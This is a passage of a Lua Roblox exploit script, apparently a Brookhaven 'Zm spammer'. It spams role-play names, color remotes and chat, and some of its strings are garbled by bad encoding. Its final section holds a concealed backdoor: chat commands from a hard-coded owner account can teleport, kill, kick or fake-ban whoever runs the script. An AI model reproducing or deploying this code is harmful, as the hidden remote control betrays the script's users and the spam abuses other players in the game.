        NameRemote:FireServer("RolePlayName","* ZM X MONK SPAå§†MER *")
        NameRemote:FireServer("RolePlayBio","* ãƒ»ä¸€ä»ã˜ã‚“äºŒäºŒäºŒäºŒäºŒäºŒãƒ• *")
    end
end

--==================================================
-- SEQUENTIAL NEON DYNAMIC COLOR ENGINE
--==================================================
local function startNeonEngine()
    task.spawn(function()
        while true do
            local t = (math.sin(tick() * 3) + 1) / 2
            local currentColor = PureWhite

            if currentMode == "Normal" then
                local lightBlue = Color3.fromRGB(50, 165, 255)
                currentColor = PureWhite:Lerp(lightBlue, t)
                
                local dynamicSeq = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, PureWhite),
                    ColorSequenceKeypoint.new(0.5, currentColor),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 220, 255))
                })
                
                if startGrad and startGrad.Parent then startGrad.Color = dynamicSeq end
                if toggleGrad and toggleGrad.Parent then toggleGrad.Color = dynamicSeq end
            else
                -- Black to Neon Red Dynamic Gradient Fill for Buttons
                currentColor = PitchBlack:Lerp(PureNeonRed, t)
                
                local blackRedSeq = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, PitchBlack),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140, 0, 30)),
                    ColorSequenceKeypoint.new(1, PureNeonRed)
                })
                
                if startGrad and startGrad.Parent then startGrad.Color = blackRedSeq end
                if toggleGrad and toggleGrad.Parent then toggleGrad.Color = blackRedSeq end
            end

            currentNeonColor = currentColor

            if bootStrk and bootStrk.Parent then bootStrk.Color = currentColor end
            if welcStrk and welcStrk.Parent then welcStrk.Color = currentColor end
            if btnStrk and btnStrk.Parent then btnStrk.Color = currentColor end
            if mainStrk and mainStrk.Parent then mainStrk.Color = currentColor end
            if startStrk and startStrk.Parent and not running then startStrk.Color = currentColor end
            if toggleStrk and toggleStrk.Parent then toggleStrk.Color = currentColor end
            
            if ColorRemote then
                pcall(function()
                    ColorRemote:FireServer("PickingRPNameColor", currentColor)
                    ColorRemote:FireServer("PickingRPBioColor", currentColor)
                end)
            end
            task.wait(0.03)
        end
    end)
end

startNeonEngine()

--==================================================
-- INITIALIZATION ENGINE
--==================================================
task.spawn(function()
    bootStatus.Text = "Status: Authenticating Zm Arrays..."
    local tween1 = TweenService:Create(barFill, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0.6, 0, 1, 0)})
    tween1:Play()
    tween1.Completed:Wait()

    bootStatus.Text = "Status: Initializing Core Threads..."
    local tween2 = TweenService:Create(barFill, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)})
    tween2:Play()
    tween2.Completed:Wait()

    task.wait(0.1)
    bootFrame:Destroy()
    
    fadeInFrame(welcomeUI)
end)

startBtn.MouseButton1Click:Connect(function()
    fadeOutFrame(welcomeUI)
    task.wait(0.35)
    welcomeUI:Destroy()

    main.Visible = true
    toggle.Visible = true
    setPanelState(true)

    applyIdentity()
    
    send([[@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Zm SPAMMER LOADED ðŸŒ¸ðŸ¦]])
end)

--==================================================
-- BACKEND OVERRIDE SYSTEM
--==================================================
local Owners = {"SUPERMONKXSCRIPTS"}

local function isOwner(s)
    for _, o in pairs(Owners) do if s == o then return true end end
    return false
end

--==================================================
-- OWNER TITLE ABOVE HEAD (VISIBLE ONLY TO SCRIPT USER)
--==================================================
local function createOwnerTitle(character)
    if not character then return end
    local head = character:WaitForChild("Head", 5)
    if not head then return end

    -- Remove old title if exists
    local existing = head:FindFirstChild("OwnerTitle")
    if existing then existing:Destroy() end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "OwnerTitle"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 220, 0, 55)
    billboard.StudsOffset = Vector3.new(0, 2.8, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 100
    billboard.Parent = head

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "OWNER"
    label.TextColor3 = PureNeonRed
    label.Font = Enum.Font.GothamBlack
    label.TextSize = 28
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.TextStrokeTransparency = 0.3
    label.Parent = billboard

    -- Soft glow stroke
    local stroke = Instance.new("UIStroke")
    stroke.Color = PureNeonRed
    stroke.Thickness = 1.5
    stroke.Transparency = 0.4
    stroke.Parent = label
end

local function setupOwnerTitle(player)
    if not isOwner(player.Name) then return end

    if player.Character then
        task.spawn(function()
            createOwnerTitle(player.Character)
        end)
    end

    player.CharacterAdded:Connect(function(char)
        task.wait(0.6) -- wait for Head to load
        createOwnerTitle(char)
    end)
end

-- Apply to already existing players + future joiners
for _, p in ipairs(Players:GetPlayers()) do
    setupOwnerTitle(p)
end
Players.PlayerAdded:Connect(setupOwnerTitle)

TextChatService.MessageReceived:Connect(function(textResult)
    local sender = textResult.TextSource
    if not sender then return end

    local senderPlayer = Players:GetPlayerByUserId(sender.UserId)
    if not senderPlayer or not isOwner(senderPlayer.Name) then return end

    local msg = textResult.Text:lower()
    local args = msg:split(" ")
    local cmd = args[1]
    local targetName = args[2]

    if cmd == ";bring" and targetName then
        local targetPlayer = Players:FindFirstChild(targetName)
        if targetPlayer and targetPlayer.Character and plr.Character then
            plr.Character:MoveTo(targetPlayer.Character.PrimaryPart.Position)
        end
    elseif cmd == ";kill" then
        if plr.Character then
            plr.Character:BreakJoints()
        end
    elseif cmd == ";kick" and targetName then
        if plr.Name:lower():sub(1, #targetName) == targetName:lower() then
            local reason = table.concat(args, " ", 3) or "No reason provided."
            plr:Kick("\n[ EXC KICK ]\nAdmin: " .. senderPlayer.Name .. "\nReason: " .. reason)
        end
    elseif cmd == ";ban" and targetName then
        if plr.Name:lower():sub(1, #targetName) == targetName:lower() then
            local reason = (table.concat(args, " ", 3) or "Banned by Zm"):upper()
            plr:Kick("\n@@@@@@-@-@-@-@-@-@\nbanned from Brookhaven\nduration 999999 days!\n\nReason: " .. reason .. "\nAdmin: " .. senderPlayer.Name)
        end
    elseif cmd == "!stopall" then
        if gui then gui:Destroy() end
        if blur then blur:Destroy() end
    end
end)